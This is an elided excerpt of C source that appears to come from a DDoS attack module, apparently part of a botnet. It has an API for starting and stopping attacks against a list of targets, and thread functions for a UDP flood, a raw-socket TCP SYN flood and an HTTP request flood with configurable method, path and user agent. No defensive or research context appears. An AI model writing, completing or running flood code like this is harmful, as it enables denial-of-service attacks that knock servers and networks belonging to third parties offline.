...
static int attack_get_option_int(attack_option_t *options, size_t count,
                                 uint8_t key, int default_val);
static const char *attack_get_option_str(attack_option_t *options, size_t count,
                                         uint8_t key, const char *default_val);
...
attack_handle_t *attack_modern_start(attack_vector_t vector,
                                     attack_target_t *targets,
                                     size_t target_count,
                                     attack_option_t *options,
                                     size_t option_count, uint32_t duration) {
  ...
  log_info("Started attack: vector=%d, targets=%zu, duration=%u", vector,
           target_count, duration);
...
void attack_modern_stop(attack_handle_t *handle) {
  ...
  log_info("Stopped attack: packets=%lu, bytes=%lu", handle->stats.packets_sent,
...
void attack_modern_cleanup(void) { log_info("Attack module cleanup complete"); }
...
static void *attack_thread_udp_flood(void *arg) {
  ...
  int payload_size = attack_get_option_int(
      handle->options, handle->option_count, ATTACK_OPT_PAYLOAD_SIZE, 512);
  bool random_payload = attack_get_option_int(
      handle->options, handle->option_count, ATTACK_OPT_PAYLOAD_RANDOM, 1);
  ...
  while (handle->running && time(NULL) < end_time) {
    ...
    ssize_t sent =
        sendto(sock, payload, payload_size, 0, (struct sockaddr *)&target->addr,
...
static void *attack_thread_tcp_syn(void *arg) {
  ...
  if (sockfd < 0) {
    log_error("Failed to create raw socket (requires root): %s",
              strerror(errno));
    return NULL;
  }
...
static void *attack_thread_http_flood(void *arg) {
  ...
  // Get options
  const char *http_method = attack_get_option_str(
      handle->options, handle->option_count, ATTACK_OPT_HTTP_METHOD, "GET");
  const char *http_path = attack_get_option_str(
      handle->options, handle->option_count, ATTACK_OPT_HTTP_PATH, "/");
  const char *user_agent = attack_get_option_str(
      handle->options, handle->option_count, ATTACK_OPT_USER_AGENT,
  ...
  snprintf(
      ...
      inet_ntoa(
          handle->targets[0].addr.sin_addr), // Use first target's IP as Host
      user_agent);
  ...
  log_info("HTTP flood started: %zu targets, method %s, path %s, duration %u "
           "seconds",
  ...
  while (handle->running && time(NULL) < end_time) {
    ...
    if (sockets[target_idx] < 0) {
      ...
      // Set socket options
      int optval = 1;
      setsockopt(sockets[target_idx], SOL_SOCKET, SO_REUSEADDR, &optval,
                 sizeof(optval));
      ...
      timeout.tv_sec = 5;
      timeout.tv_usec = 0;
      setsockopt(sockets[target_idx], SOL_SOCKET, SO_SNDTIMEO, &timeout,
                 sizeof(timeout));
      setsockopt(sockets[target_idx], SOL_SOCKET, SO_RCVTIMEO, &timeout,
                 sizeof(timeout));
    ...
    // Send HTTP request
    ssize_t sent =
        send(sockets[target_idx], http_request, request_len, MSG_NOSIGNAL);
    ...
    if (sent > 0) {
      ...
      char recv_buf[4096];
      ssize_t received =
          recv(sockets[target_idx], recv_buf, sizeof(recv_buf), MSG_DONTWAIT);
